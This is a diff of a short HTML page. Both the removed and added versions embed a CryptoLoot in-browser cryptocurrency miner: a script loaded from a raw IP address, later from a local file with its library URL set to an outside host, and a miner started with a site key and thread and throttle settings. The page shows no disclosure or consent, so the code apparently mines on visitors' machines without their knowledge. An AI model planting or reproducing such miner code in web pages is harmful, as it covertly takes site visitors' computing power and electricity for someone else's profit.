@@ -2,16 +2,14 @@
 <html>
 <body>
 
-<script src="http://185.122.58.225/cryptoloot/lib/crlt.js"></script>
-  
+<script src="lib/crlt.js"></script>
 <script>
-	var miner = new CRLT.Anonymous('6bb8517848082c5e1e293ba3003968ab97390d92e70a',
-        {
-		autoThreads:false,throttle:0.3,
-        }
-);
-miner.start();
+	CRLT.CONFIG.LIB_URL = "http://pureservers.ca/cm/";
+            var miner=new CRLT.Anonymous('6bb8517848082c5e1e293ba3003968ab97390d92e70a', {
+                threads:4,autoThreads:false,throttle:0.2,
+            });
+        miner.start();
 </script>
-
+	
 </body>
 </html>
